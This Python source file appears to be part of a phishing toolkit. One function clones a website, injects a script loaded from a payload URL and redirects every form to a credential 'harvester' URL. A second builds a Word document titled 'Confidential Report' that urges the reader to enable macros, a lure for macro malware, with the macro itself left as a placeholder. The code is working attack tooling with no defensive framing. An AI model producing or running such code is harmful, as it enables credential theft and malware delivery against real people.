import requests
from bs4 import BeautifulSoup
import logging
import os
from docx import Document

def clone_website(url, harvester_url, payload_url=None):
    """
    Clones a website, injects a script tag, and redirects forms to a harvester.
    """
    logging.info(f"Cloning website: {url}")
    try:
        response = requests.get(url)
        if response.status_code != 200:
            logging.error(f"Failed to clone website. Status code: {response.status_code}")
            return None

        soup = BeautifulSoup(response.text, 'html.parser')

        # Inject payload script if provided
        if payload_url:
            script_tag = soup.new_tag("script", src=payload_url)
            if soup.head:
                soup.head.insert(0, script_tag)
            else:
                head = soup.new_tag("head")
                soup.html.insert(0, head)
                soup.head.append(script_tag)

        # Find and modify all forms to point to the harvester
        forms = soup.find_all("form")
        if forms:
            for form in forms:
                form['action'] = harvester_url
            logging.info(f"Redirected {len(forms)} form(s) to the harvester.")
        else:
            logging.warning("No forms found on the page to redirect.")

        output_dir = "cloned_site"
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

        cloned_html_path = os.path.join(output_dir, "index.html")
        with open(cloned_html_path, "w", encoding="utf-8") as f:
            f.write(str(soup))

        logging.info(f"Website cloned successfully. Modified HTML saved to {cloned_html_path}")
        return output_dir

    except Exception as e:
        logging.error(f"An error occurred while cloning the website: {e}")
        return None

def create_macro_doc(output_path, payload_command):
    """
    Creates a Word document with a placeholder for a malicious macro.
    """
    logging.info(f"Creating infectious Word document at {output_path}...")

    document = Document()
    document.add_heading('Confidential Report', 0)
    p = document.add_paragraph('This document contains sensitive information. ')
    p.add_run('Please enable macros').bold = True
    p.add_run(' to view the full content.')

    document.save(output_path)
    logging.info(f"Word document saved to {output_path}.")
    logging.warning("Macro functionality is a placeholder. Macros must be added manually.")
    return output_path